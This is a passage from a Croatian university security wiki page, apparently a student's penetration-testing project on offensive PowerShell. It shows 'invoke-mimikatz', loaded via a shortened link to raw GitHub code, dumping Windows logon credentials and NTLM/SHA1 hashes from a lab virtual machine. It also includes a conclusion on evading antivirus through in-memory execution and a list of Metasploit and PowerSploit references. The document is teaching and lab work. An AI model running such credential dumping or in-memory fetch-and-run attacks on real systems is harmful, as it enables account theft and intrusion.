+<p>Gdje je opet korišten bitly alat za kraćenje URL-a, a u tom URL-u je zapravo raw format mimikatza sa github-a<sup><a href="Offensive_powershell.html#Literatura">[8]</a></sup>.<br />
+Nakon toga upisana je posljednja naredba u PowerShell-u
+</p>
+<pre>invoke-mimikatz
+</pre>
+<p>Koja izbacuje sve kredencijske podatke svih Windows korisničkih računa koji su napravljeni u kompromitiranom računalu, a to izgleda ovako:<br />
+</p>
+<pre>
+PS C:\Users\PenTest&gt; invoke-mimikatz
+
+  .#####.   mimikatz 2.1 (x64) built on Nov 10 2016 15:31:14
+ .## ^ ##.  &quot;A La Vie, A L'Amour&quot;
+ ## / \ ##  /* * *
+ ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
+  '#####'                                     with 20 modules * * */
+ERROR mimikatz_initOrClean&#160;; CoInitializeEx: 80010106
+
+mimikatz(powershell) # sekurlsa::logonpasswords
+
+Authentication Id&#160;: 0&#160;; 1762878 (00000000:001ae63e)
+Session          &#160;: Interactive from 1
+User Name        &#160;: PenTest
+Domain           &#160;: DESKTOP-VM3QIJB
+Logon Server     &#160;: DESKTOP-VM3QIJB
+Logon Time       &#160;: 1/12/2017 1:35:30 AM
+SID              &#160;: S-1-5-21-1138842331-819270373-2980095412-1001
+	msv&#160;:	
+	 [00000003] Primary
+	 * Username&#160;: PenTest
+	 * Domain  &#160;: DESKTOP-VM3QIJB
+	 * NTLM    &#160;: 31d6cfe0d16ae931b73c59d7e0c089c0
+	 * SHA1    &#160;: da39a3ee5e6b4b0d3255bfef95601890afd80709
+	 [00010000] CredentialKeys
+	 * NTLM    &#160;: 31d6cfe0d16ae931b73c59d7e0c089c0
+	 * SHA1    &#160;: da39a3ee5e6b4b0d3255bfef95601890afd80709
+	tspkg&#160;:	
+	wdigest&#160;:	
+	 * Username&#160;: PenTest
+	 * Domain  &#160;: DESKTOP-VM3QIJB
+	 * Password&#160;: (null)
+	kerberos&#160;:	
+	 * Username&#160;: PenTest
+	 * Domain  &#160;: DESKTOP-VM3QIJB
+	 * Password&#160;: (null)
+	ssp&#160;:	
+	credman&#160;:	
+
+Authentication Id&#160;: 0&#160;; 1762076 (00000000:001ae31c)
+Session          &#160;: Interactive from 1
+User Name        &#160;: PenTest
+Domain           &#160;: DESKTOP-VM3QIJB
+Logon Server     &#160;: DESKTOP-VM3QIJB
+Logon Time       &#160;: 1/12/2017 1:35:30 AM
+SID              &#160;: S-1-5-21-1138842331-819270373-2980095412-1001
+	msv&#160;:	
+	 [00010000] CredentialKeys
+	 * NTLM    &#160;: 31d6cfe0d16ae931b73c59d7e0c089c0
+	 * SHA1    &#160;: da39a3ee5e6b4b0d3255bfef95601890afd80709
+	 [00000003] Primary
+	 * Username&#160;: PenTest
+	 * Domain  &#160;: DESKTOP-VM3QIJB
+	 * NTLM    &#160;: 31d6cfe0d16ae931b73c59d7e0c089c0
+	 * SHA1    &#160;: da39a3ee5e6b4b0d3255bfef95601890afd80709
+	tspkg&#160;:	
+	wdigest&#160;:	
+	 * Username&#160;: PenTest
+	 * Domain  &#160;: DESKTOP-VM3QIJB
+	 * Password&#160;: (null)
+	kerberos&#160;:	
+	 * Username&#160;: PenTest
+	 * Domain  &#160;: DESKTOP-VM3QIJB
+	 * Password&#160;: (null)
+	ssp&#160;:	
+	credman&#160;:	
+
+Authentication Id&#160;: 0&#160;; 997 (00000000:000003e5)
+Session          &#160;: Service from 0
+User Name        &#160;: LOCAL SERVICE
+Domain           &#160;: NT AUTHORITY
+Logon Server     &#160;: (null)
+Logon Time       &#160;: 1/12/2017 1:35:01 AM
+SID              &#160;: S-1-5-19
+	msv&#160;:	
+	tspkg&#160;:	
+	wdigest&#160;:	
+	 * Username&#160;: (null)
+	 * Domain  &#160;: (null)
+	 * Password&#160;: (null)
+	kerberos&#160;:	
+	 * Username&#160;: (null)
+	 * Domain  &#160;: (null)
+	 * Password&#160;: (null)
+	ssp&#160;:	
+	credman&#160;:	
+
+Authentication Id&#160;: 0&#160;; 49141 (00000000:0000bff5)
+Session          &#160;: Interactive from 1
+User Name        &#160;: DWM-1
+Domain           &#160;: Window Manager
+Logon Server     &#160;: (null)
+Logon Time       &#160;: 1/12/2017 1:35:01 AM
+SID              &#160;: S-1-5-90-0-1
+	msv&#160;:	
+	tspkg&#160;:	
+	wdigest&#160;:	
+	 * Username&#160;: DESKTOP-VM3QIJB$
+	 * Domain  &#160;: WORKGROUP
+	 * Password&#160;: (null)
+	kerberos&#160;:	
+	ssp&#160;:	
+	credman&#160;:	
+
+Authentication Id&#160;: 0&#160;; 48672 (00000000:0000be20)
+Session          &#160;: Interactive from 1
+User Name        &#160;: DWM-1
+Domain           &#160;: Window Manager
+Logon Server     &#160;: (null)
+Logon Time       &#160;: 1/12/2017 1:35:01 AM
+SID              &#160;: S-1-5-90-0-1
+	msv&#160;:	
+	tspkg&#160;:	
+	wdigest&#160;:	
+	 * Username&#160;: DESKTOP-VM3QIJB$
+	 * Domain  &#160;: WORKGROUP
+	 * Password&#160;: (null)
+	kerberos&#160;:	
+	ssp&#160;:	
+	credman&#160;:	
+
+Authentication Id&#160;: 0&#160;; 996 (00000000:000003e4)
+Session          &#160;: Service from 0
+User Name        &#160;: DESKTOP-VM3QIJB$
+Domain           &#160;: WORKGROUP
+Logon Server     &#160;: (null)
+Logon Time       &#160;: 1/12/2017 1:35:01 AM
+SID              &#160;: S-1-5-20
+	msv&#160;:	
+	tspkg&#160;:	
+	wdigest&#160;:	
+	 * Username&#160;: DESKTOP-VM3QIJB$
+	 * Domain  &#160;: WORKGROUP
+	 * Password&#160;: (null)
+	kerberos&#160;:	
+	 * Username&#160;: desktop-vm3qijb$
+	 * Domain  &#160;: WORKGROUP
+	 * Password&#160;: (null)
+	ssp&#160;:	
+	credman&#160;:	
+
+Authentication Id&#160;: 0&#160;; 25653 (00000000:00006435)
+Session          &#160;: UndefinedLogonType from 0
+User Name        &#160;: (null)
+Domain           &#160;: (null)
+Logon Server     &#160;: (null)
+Logon Time       &#160;: 1/12/2017 1:35:00 AM
+SID              &#160;: 
+	msv&#160;:	
+	tspkg&#160;:	
+	wdigest&#160;:	
+	kerberos&#160;:	
+	ssp&#160;:	
+	credman&#160;:	
+
+Authentication Id&#160;: 0&#160;; 999 (00000000:000003e7)
+Session          &#160;: UndefinedLogonType from 0
+User Name        &#160;: DESKTOP-VM3QIJB$
+Domain           &#160;: WORKGROUP
+Logon Server     &#160;: (null)
+Logon Time       &#160;: 1/12/2017 1:35:00 AM
+SID              &#160;: S-1-5-18
+	msv&#160;:	
+	tspkg&#160;:	
+	wdigest&#160;:	
+	 * Username&#160;: DESKTOP-VM3QIJB$
+	 * Domain  &#160;: WORKGROUP
+	 * Password&#160;: (null)
+	kerberos&#160;:	
+	 * Username&#160;: desktop-vm3qijb$
+	 * Domain  &#160;: WORKGROUP
+	 * Password&#160;: (null)
+	ssp&#160;:	
+	credman&#160;:	
+
+mimikatz(powershell) # exit
+Bye!
+</pre>
+<p>Kao što vidimo nama je interesantno da vidimo korisnika i na kojem je serveru:
+</p>
+<pre>
+User Name        &#160;: PenTest
+Domain           &#160;: DESKTOP-VM3QIJB
+Logon Server     &#160;: DESKTOP-VM3QIJB
+</pre>
+<p>vidimo username i password
+</p>
+<pre>
+* Username&#160;: PenTest
+	 * Domain  &#160;: DESKTOP-VM3QIJB
+	 * Password&#160;: (null)
+</pre>
+<p>te vidimo kredencijske ključeve
+</p>
+<pre>
+ [00010000] CredentialKeys
+	 * NTLM    &#160;: 31d6cfe0d16ae931b73c59d7e0c089c0
+	 * SHA1    &#160;: da39a3ee5e6b4b0d3255bfef95601890afd80709
+</pre>
+<p><br />
+</p>
+<h2> <span class="mw-headline" id="Zaklju.C4.8Dak"> Zaključak </span></h2>
+<p>Ovaj projekt je bio vrlo zanimljivo i poučno iskustvo. Naučio sam da u sigurnosti nije bitno hoćemo li biti napadnuti, već kada. Naravno ako smo dovoljno interesantna riba. Sa tehničkog aspekta bilo je vrlo zanimljivo koristiti Kali Linux i njegove alate i shvatio sam da me interesira penetracijsko testiranje Windows računala. Također, zanimljivo i zastrašujuće je bilo vidjeti koliko već gotovih skripta ima i što sve napadač može iskoristiti na svojoj žrtvi. Meni kao normalnom čovjeku, prisluškivanje preko mikrofona slušalica ili mikrofona web kamere, uzimanje <i>screenshot-a</i> trenutačnog stanja na računalu da se vidi čime se korisnik bavi te snimanje videa i slika preko web kamere je jednostavno zapanjujuće.Koliko sam dalje istraživao sve sam više razumio da je to zapravo samo vrh velike sante leda. Postavljanje radne okoline i Oracle VirtualBox-a bila je velika muka pogotovo oko instalacije <i>VirtualBox guest additions-a</i>, ali to je bilo posebno iskustvo koje mi je pružalo da više upoznam Linux operacijski sustavi i na koji način radi Kali općenito. Najinteresantniji dio je bio kako napadač može preko PowerShella izvršavati razne napade i izviđanje računala bez da se aktivira Antivirusni sustav jer se sve izvršava u memoriji i nema nikakvih dodirnih točaka sa diskom. Također osobna teza da je instaliran antivirusni sustav na računalu dovoljna obrana od napadača pada u vodu jer daljnjim istraživanjem otkrivam da napadač bez ikakvih problema raznim skriptama i exploit alatima zaobilazi bilo koji antivirusni sustav i <i>User Acces Control</i> u Windows operacijskim sustavima. U svakom slučaju ovo je bio jedan vrlo zanimljiv i interesantan projekt kojeg sam sa radošću pisao.
+</p>
+<h2> <span class="mw-headline" id="Literatura"> Literatura </span></h2>
+<ol><li> Metcalf, Sean (2016), <i>PowerShell Security: PowerShell Attack Tools, Mitigation, &amp; Detection</i>, Adsecurity, preuzeto 07.01.2017. sa: <a href="https://adsecurity.org/?p=2921" class="external free" rel="nofollow">https://adsecurity.org/?p=2921</a>
+</li><li> Metcalf, Sean (2016), <i>Detecting Offensive PowerShell Attack Tools</i>, Adsecurity, preuzeto 07.01.2017. sa: <a href="https://adsecurity.org/?p=2604" class="external free" rel="nofollow">https://adsecurity.org/?p=2604</a>
+</li><li> Offensive Security (2016), <i>Using the Msfconsole Interface</i>, Offensive Security, preuzeto 09.01.2017. sa: <a href="https://www.offensive-security.com/metasploit-unleashed/msfconsole/" class="external free" rel="nofollow">https://www.offensive-security.com/metasploit-unleashed/msfconsole/</a>
+</li><li> Wikipedia (2016), <i>Metasploit Project</i>, Wikipedia, preuzeto 11.01.2017. sa: <a href="https://en.wikipedia.org/wiki/Metasploit_Project" class="external free" rel="nofollow">https://en.wikipedia.org/wiki/Metasploit_Project</a>
+</li><li> Infosec Institute (2015), <i>PowerShell Toolkit: PowerSploit</i>, Infosec Institute, preuzeto 11.01.2017. sa: <a href="http://resources.infosecinstitute.com/powershell-toolkit-powersploit/" class="external free" rel="nofollow">http://resources.infosecinstitute.com/powershell-toolkit-powersploit/</a>
+</li><li> Metcalf, Sean (2016), <i>Unofficial Guide to Mimikatz &amp; Command Reference</i>, Adsecurity, preuzeto 11.01.2017. sa: <a href="https://adsecurity.org/?page_id=1821" class="external free" rel="nofollow">https://adsecurity.org/?page_id=1821</a>
+</li><li> Offensive Security (2016),<i>Using the MSFvenom Command Line Interface</i> , preuzeto 12.01.2017. sa: <a href="https://www.offensive-security.com/metasploit-unleashed/msfvenom/" class="external free" rel="nofollow">https://www.offensive-security.com/metasploit-unleashed/msfvenom/</a>
+</li><li> PowerShell Mafia (2016), <i>PowerSploit</i>, preuzeto 12.01.2017. sa: <a href="https://github.com/PowerShellMafia/PowerSploit" class="external free" rel="nofollow">https://github.com/PowerShellMafia/PowerSploit</a>
+</li><li> Microsoft (2016), <i>WebClient Class</i>, preuzeto 12.01.2017. sa: <a href="https://msdn.microsoft.com/en-us/library/system.net.webclient(v=vs.110).aspx" class="external free" rel="nofollow">https://msdn.microsoft.com/en-us/library/system.net.webclient(v=vs.110).aspx</a>
+</li><li> Wonder HOWTO (2016), <i>Bypass Antivirus Using Powershell and Metasploit (Kali Tutorial)</i>, preuzeto 12.01.2017 sa: <a href="http://null-byte.wonderhowto.com/how-to/bypass-antivirus-using-powershell-and-metasploit-kali-tutorial-0167601/" class="external free" rel="nofollow">http://null-byte.wonderhowto.com/how-to/bypass-antivirus-using-powershell-and-metasploit-kali-tutorial-0167601/</a>
+</li><li> Wikipedia (2016), <i>Windows Defender</i>, Wikipedia, preuzeto 12.01.2017. sa: <a href="https://en.wikipedia.org/wiki/Windows_Defender" class="external free" rel="nofollow">https://en.wikipedia.org/wiki/Windows_Defender</a>
+</li></ol>
+<hr />
+<p><b>Video literatura</b>
+</p>
+<ol><li> Using PowerSploit Invoke-Shellcode w/Meterpreter Shellcode created by msfvenom <a href="https://www.youtube.com/watch?v=otpPnWbEaDA" class="external free" rel="nofollow">https://www.youtube.com/watch?v=otpPnWbEaDA</a>
+</li><li> Meterpreter to Interactive Powershell then running PowerSploit Invoke-Mimikatz <a href="https://www.youtube.com/watch?v=k0lz7OnTdYU" class="external free" rel="nofollow">https://www.youtube.com/watch?v=k0lz7OnTdYU</a>
+</li><li> Privilege Escalation Technique in Windows 10 - UAC ASK <a href="https://www.youtube.com/watch?v=OqmxRIqC3FE" class="external free" rel="nofollow">https://www.youtube.com/watch?v=OqmxRIqC3FE</a>
+</li><li> Metasploit - Reverse meterpreter shell -- DLL Injection using PowerSploit and Metasploit <a href="https://www.youtube.com/watch?v=yKoD5Oy8CKQ" class="external free" rel="nofollow">https://www.youtube.com/watch?v=yKoD5Oy8CKQ</a>
+</li><li> Takeover a windows machine using powershell and metasploit <a href="https://www.youtube.com/watch?v=ZNLEEbaga4w" class="external free" rel="nofollow">https://www.youtube.com/watch?v=ZNLEEbaga4w</a>
+</li><li> Installing Kali Linux 2016.1 on VirtualBox <a href="https://www.youtube.com/watch?v=GpTIM9OroIY" class="external free" rel="nofollow">https://www.youtube.com/watch?v=GpTIM9OroIY</a>
+</li></ol>
+
+<!-- 
+NewPP limit report
+Preprocessor node count: 67/1000000
+Post-expand include size: 0/2097152 bytes
+Template argument size: 0/2097152 bytes
+Expensive parser function count: 0/100
+-->
+
+<!-- Saved in parser cache with key sisds:pcache:idhash:9249-0!*!0!!hr!2!edit=0 and timestamp 20190203204208 -->
+<div class="printfooter">
+Dobavljeno iz "<a href="Offensive_powershell.html">http://security.foi.hr/wiki/index.php/Offensive_powershell</a>"</div>
+				<!-- /bodytext -->
+								<!-- catlinks -->
+				<div id='catlinks' class='catlinks catlinks-allhidden'></div>				<!-- /catlinks -->
+												<div class="visualClear"></div>
+			</div>
+			<!-- /bodyContent -->
+		</div>
+		<!-- /content -->
+		<!-- header -->
+		<div id="mw-head" class="noprint">
+			
+<!-- 0 -->
+<div id="p-personal" class="">
+	<h5>Osobni alati</h5>
+	<ul>
+					<li  id="pt-login"><a href="http://security.foi.hr/wiki/index.php?title=Posebno:Prijava&amp;returnto=Offensive_powershell" title="Predlažemo Vam da se prijavite, ali nije obvezno. [o]" accesskey="o">Prijavi se</a></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+			<div id="left-navigation">
+				
+<!-- 0 -->
+<div id="p-namespaces" class="vectorTabs">
+	<h5>Imenski prostori</h5>
+	<ul>
+					<li  id="ca-nstab-main" class="selected"><span><a href="Offensive_powershell.html"  title="Pogledaj sadržaj [c]" accesskey="c">Članak</a></span></li>
+					<li  id="ca-talk" class="new"><span><a href="http://security.foi.hr/wiki/index.php?title=Razgovor:Offensive_powershell&amp;action=edit&amp;redlink=1"  title="Razgovor o stranici [t]" accesskey="t">Razgovor</a></span></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+
+<!-- 1 -->
+<div id="p-variants" class="vectorMenu emptyPortlet">
+		<h5><span>Inačice</span><a href="Offensive_powershell.html#"></a></h5>
+	<div class="menu">
+		<ul>
+					</ul>
+	</div>
+</div>
+
+<!-- /1 -->
+			</div>
+			<div id="right-navigation">
+				
+<!-- 0 -->
+<div id="p-views" class="vectorTabs">
+	<h5>Pogledi</h5>
+	<ul>
+					<li id="ca-view" class="selected"><span><a href="Offensive_powershell.html" >Čitaj</a></span></li>
+					<li id="ca-viewsource"><span><a href="http://security.foi.hr/wiki/index.php?title=Offensive_powershell&amp;action=edit"  title="Ova stranica je zaštićena. Možete pogledati izvorni kod. [e]" accesskey="e">Vidi izvor</a></span></li>
+					<li id="ca-history" class="collapsible "><span><a href="http://security.foi.hr/wiki/index.php?title=Offensive_powershell&amp;action=history"  title="Ranije izmjene na ovoj stranici. [h]" accesskey="h">Vidi stare izmjene</a></span></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+
+<!-- 1 -->
+<div id="p-cactions" class="vectorMenu emptyPortlet">
+	<h5><span>Radnje</span><a href="Offensive_powershell.html#"></a></h5>
+	<div class="menu">
+		<ul>
+					</ul>
+	</div>
+</div>
+
+<!-- /1 -->
+
+<!-- 2 -->
+<div id="p-search">
+	<h5><label for="searchInput">Traži</label></h5>
+	<form action="http://security.foi.hr/wiki/index.php" id="searchform">
+		<input type='hidden' name="title" value="Posebno:Traži"/>
+				<input id="searchInput" name="search" type="text"  title="Pretraži ovaj wiki [f]" accesskey="f"  value="" />
+		<input type='submit' name="go" class="searchButton" id="searchGoButton"	value="Kreni" title="Idi na stranicu s ovim imenom ako ona postoji" />
+		<input type="submit" name="fulltext" class="searchButton" id="mw-searchButton" value="Traži" title="Traži ovaj tekst na svim stranicama" />
+			</form>
+</div>
+
+<!-- /2 -->
+			</div>
+		</div>
+		<!-- /header -->
+		<!-- panel -->
+			<div id="mw-panel" class="noprint">
+				<!-- logo -->
+					<div id="p-logo"><a style="background-image: url(../../images/osslogo.png);" href="../../wiki.html"  title="Glavna stranica"></a></div>
+				<!-- /logo -->
+				
+<!-- navigation -->
+<div class="portal" id='p-navigation'>
+	<h5>Orijentacija</h5>
+	<div class="body">
+				<ul>
+					<li id="n-mainpage-description"><a href="../../wiki.html" title="Posjeti glavnu stranicu [z]" accesskey="z">Glavna stranica</a></li>
+					<li id="n-portal"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Portal_zajednice" title="O projektu, što možete učiniti, gdje je što">Portal zajednice</a></li>
+					<li id="n-currentevents"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Novosti" title="O trenutačnim događajima">Aktualno</a></li>
+					<li id="n-recentchanges"><a href="./Posebno:Nedavne_promjene.html" title="Popis nedavnih promjena u wikiju. [r]" accesskey="r">Nedavne promjene</a></li>
+					<li id="n-randompage"><a href="./Posebno:Slučajna_stranica.html" title="Učitaj slučajnu stranicu [x]" accesskey="x">Slučajna stranica</a></li>
+					<li id="n-help"><a href="./Pomoć:Pomoć.html" title="Mjesto za pomoć suradnicima.">Pomoć</a></li>
+				</ul>
+			</div>
+</div>
+
+<!-- /navigation -->
+
+<!-- SEARCH -->
+
+<!-- /SEARCH -->
+
+<!-- TOOLBOX -->
+<div class="portal" id="p-tb">
+	<h5>Traka s alatima</h5>
+	<div class="body">
+		<ul>
+					<li id="t-whatlinkshere"><a href="http://security.foi.hr/wiki/index.php/Posebno:%C5%A0to_vodi_ovamo/Offensive_powershell" title="Popis svih stranica koje sadrže poveznice ovamo [j]" accesskey="j">Što vodi ovamo</a></li>
+						<li id="t-recentchangeslinked"><a href="http://security.foi.hr/wiki/index.php/Posebno:Povezane_promjene/Offensive_powershell" title="Nedavne promjene na stranicama na koje vode ovdašnje poveznice [k]" accesskey="k">Povezane stranice</a></li>
+																																										<li id="t-specialpages"><a href="./Posebno:Posebne_stranice.html" title="Popis posebnih stranica [q]" accesskey="q">Posebne stranice</a></li>
+									<li id="t-print"><a href="http://security.foi.hr/wiki/index.php?title=Offensive_powershell&amp;printable=yes" rel="alternate" title="Verzija za ispis ove stranice [p]" accesskey="p">Verzija za ispis</a></li>
+						<li id="t-permalink"><a href="http://security.foi.hr/wiki/index.php?title=Offensive_powershell&amp;oldid=40398" title="Trajna poveznica na ovu verziju stranice">Trajna poveznica</a></li>
+						</ul>
+	</div>
+</div>
+
+<!-- /TOOLBOX -->
+
+<!-- LANGUAGES -->
+
+<!-- /LANGUAGES -->
+			</div>
+		<!-- /panel -->
+		<!-- footer -->
+		<div id="footer">
+											<ul id="footer-info">
+																	<li id="footer-info-lastmod"> Datum zadnje promjene na ovoj stranici: 15:36, 16. siječnja 2017.</li>
+																							<li id="footer-info-viewcount">Ova stranica je pogledana 3.478 puta.</li>
+																							<li id="footer-info-copyright">Sadržaji se koriste u skladu s <a href="http://creativecommons.org/licenses/by-sa/3.0/" class="external ">Creative Commons Attribution Share Alike</a>.</li>
+															</ul>
+															<ul id="footer-places">
+																	<li id="footer-places-privacy"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Za%C5%A1tita_privatnosti" title="SIS Wiki:Zaštita privatnosti">Zaštita privatnosti</a></li>
+																							<li id="footer-places-about"><a href="./SIS_Wiki:O_projektu_SIS_Wiki.html" title="SIS Wiki:O projektu SIS Wiki">O projektu SIS Wiki</a></li>
+																							<li id="footer-places-disclaimer"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:General_disclaimer" title="SIS Wiki:General disclaimer">Odricanje od odgovornosti</a></li>
+															</ul>
+											<ul id="footer-icons" class="noprint">
+					<li id="footer-copyrightico">
+						<a href="http://creativecommons.org/licenses/by-sa/3.0/"><img src="../skins/common/images/cc-by-sa.png" alt="Creative Commons Attribution Share Alike" width="88" height="31" /></a>
+					</li>
+					<li id="footer-poweredbyico">
+						<a href="http://www.mediawiki.org/"><img src="../skins/common/images/poweredby_mediawiki_88x31.png" alt="Powered by MediaWiki" width="88" height="31" /></a>
+					</li>
+				</ul>
+						<div style="clear:both"></div>
+		</div>
+		<!-- /footer -->
+		
+<script src="../load.php%3Fdebug=false&amp;lang=hr&amp;modules=startup&amp;only=scripts&amp;skin=vector&amp;*"></script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.config.set({"wgCanonicalNamespace": "", "wgCanonicalSpecialPageName": false, "wgNamespaceNumber": 0, "wgPageName": "Offensive_powershell", "wgTitle": "Offensive powershell", "wgAction": "view", "wgArticleId": 9249, "wgIsArticle": true, "wgUserName": null, "wgUserGroups": ["*"], "wgCurRevisionId": 40398, "wgCategories": [], "wgBreakFrames": false, "wgRestrictionEdit": [], "wgRestrictionMove": []});
+}
+</script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.loader.load(["mediawiki.util", "mediawiki.legacy.wikibits", "mediawiki.legacy.ajax"]);
+	mediaWiki.loader.go();
+}
+</script>
+
+<script>if ( window.mediaWiki ) {
+	mediaWiki.user.options.set({"ccmeonemails":0,"cols":80,"contextchars":50,"contextlines":5,"date":"default","diffonly":0,"disablemail":0,"disablesuggest":0,"editfont":"default","editondblclick":0,"editsection":1,"editsectiononrightclick":0,"enotifminoredits":0,"enotifrevealaddr":0,"enotifusertalkpages":1,"enotifwatchlistpages":0,"extendwatchlist":0,"externaldiff":0,"externaleditor":0,"fancysig":0,"forceeditsummary":0,"gender":"unknown","hideminor":0,"hidepatrolled":0,"highlightbroken":1,"imagesize":2,"justify":0,"math":1,"minordefault":0,"newpageshidepatrolled":0,"nocache":0,"noconvertlink":0,"norollbackdiff":0,"numberheadings":0,"previewonfirst":0,"previewontop":1,"quickbar":1,"rcdays":7,"rclimit":50,"rememberpassword":0,"rows":25,"searchlimit":20,"showhiddencats":0,"showjumplinks":1,"shownumberswatching":1,"showtoc":1,"showtoolbar":1,"skin":"vector","stubthreshold":0,"thumbsize":2,"underline":2,"uselivepreview":0,"usenewrc":0,"watchcreations":0,"watchdefault":0,"watchdeletion":0,
+	"watchlistdays":3,"watchlisthideanons":0,"watchlisthidebots":0,"watchlisthideliu":0,"watchlisthideminor":0,"watchlisthideown":0,"watchlisthidepatrolled":0,"watchmoves":0,"wllimit":250,"variant":"hr","language":"hr","searchNs0":true,"searchNs1":false,"searchNs2":false,"searchNs3":false,"searchNs4":false,"searchNs5":false,"searchNs6":false,"searchNs7":false,"searchNs8":false,"searchNs9":false,"searchNs10":false,"searchNs11":false,"searchNs12":false,"searchNs13":false,"searchNs14":false,"searchNs15":false});;mediaWiki.loader.state({"user.options":"ready"});
+}
+</script>		<!-- fixalpha -->
+		<script type="text/javascript"> if ( window.isMSIE55 ) fixalpha(); </script>
+		<!-- /fixalpha -->
+		<!-- Served in 0.537 secs. -->			</body>
+</html>
